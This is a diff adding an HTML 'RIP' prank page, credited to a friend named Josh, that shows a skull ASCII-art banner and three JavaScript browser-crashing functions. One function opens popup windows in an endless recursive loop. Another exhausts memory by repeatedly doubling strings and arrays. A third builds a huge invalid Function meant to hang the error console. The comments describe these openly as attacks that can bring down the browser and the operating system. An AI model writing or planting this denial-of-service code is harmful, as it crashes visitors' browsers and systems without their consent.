@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+ 
+  <script>
+
+//Thanks to my friend Josh for this script - (josh33901.github.com)
+//I created a dupe on my server as I feared I might one day lose access to it's majesty...
+
+  function crashme() {
+    txt = "a";
+    page = "madmog.co.uk/RIP.html";
+    //window.open(page, txt, "width=1000,height=1000");
+    //window.open(page);
+    var a = 0;
+    while(1) {
+      a++
+      txt += a;
+      setInterval(crashme, 1);
+      window.open(page, txt, "width=1000,height=1000");
+    }
+  }
+  function HeapDeath ()
+  {
+    if ( true )
+    {
+        //  This is one of my favorites, because it has the potential to bring the OS
+        //  to its knees, too, making this a failure of the JS engine, the application,
+        //  and the operating system.
+        //  Start out with a 10-character string, double it 22 times (I'm surprised
+        //  this works!), and then stuff it into an array and start doubling the array.
+        //  It's always fun to watch a web browser measure its memory usage in GB.
+        //  Some random chars are thrown in for the heck of it.
+        (function () {
+            'use strict';
+ 
+            var i,
+                // We could also build the array of methods with the following, but the
+                //   getOwnPropertyNames() method is non-shimable:
+                // Object.getOwnPropertyNames(String).filter(function (methodName) {return typeof String[methodName] === 'function'});
+                methods = [
+                    'quote', 'substring', 'toLowerCase', 'toUpperCase', 'charAt',
+                    'charCodeAt', 'indexOf', 'lastIndexOf', 'startsWith', 'endsWith',
+                    'trim', 'trimLeft', 'trimRight', 'toLocaleLowerCase',
+                    'toLocaleUpperCase', 'localeCompare', 'match', 'search',
+                    'replace', 'split', 'substr', 'concat', 'slice'
+                ],
+                methodCount = methods.length,
+                assignStringGeneric = function (methodName) {
+                    var method = String.prototype[methodName];
+                    String[methodName] = function (arg1) {
+                        return method.apply(arg1, Array.prototype.slice.call(arguments, 1));
+                    };
+                };
+ 
+            for (i = 0; i < methodCount; i++) {
+                assignStringGeneric(methods[i]);
+            }
+        }());
+        x = '0123456789';
+        for ( i = 0; i < 22; i++ ) { x = x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)) + x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)); }
+        setInterval(_HeapDeath, 5);
+    }
+  }
+ 
+  function _HeapDeath ()
+  {
+    //  Firefox actually does an admirable job of trying to handle this -- until I try
+    //  to append random strings to the array slices.
+    //  I feel a little bad for doing that.
+    x = [x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)), x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256))];
+  }
+ 
+    function Explodabob (){
+        //  This works by creating a really big invalid JS function.
+        //  It doesn't immediately crash the browser; it's way sneakier. Instead, the next time
+        //  the user goes to open up the error console, the browser will (probably) hang. Fun fun.
+        var x = 'abcdefghijklmnopqrstuvwxyz';
+        for ( var i = 0; i < 21; i++ ) { x = x + x; }
+        var f = new Function(x);
+        f();
+    }
+  </script>
+ 
+<body >
+<b>RIP - Thanks to Josh aka F1ssi0n for this script. (josh33901.github.com/wow.html)</b><pre>
+                     .ed"""" """$$$$be.
+                   -"           ^""**$$$e.
+                 ."                   '$$$c
+                /                      "4$$b
+               d  3                      $$$$
+               $  *                   .$$$$$$
+              .$  ^c           $$$$$e$$$$$$$$.
+              d$L  4.         4$$$$$$$$$$$$$$b
+              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
+  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
+ z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
+4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
+^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
+  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
+        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
+          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
+             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
+               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
+                  "$   "%*ebJLzb$e$$$$$b $P"
+                    %..      4$$$$$$$$$$ "
+                     $$$e   z$$$$$$$$$$%
+                      "*$c  "$$$$$$$P"
+                       ."""*$$$$$$$$bc
+                    .-"    .$***$$$"""*e.
+                 .-"    .e$"     "*$c  ^*b.
+          .=*""""    .e$*"          "*bc  "*$e..
+        .$"        .z*"               ^*$e.   "*****e.
+        $$ee$c   .d"                     "*$.        3.
+        ^*$E")$..$"                         *   .ee==d%
+           $.d$$$*                           *  J$$$e*
+            """""                              "$$$"
+
+</pre>
+</body>
+</html>
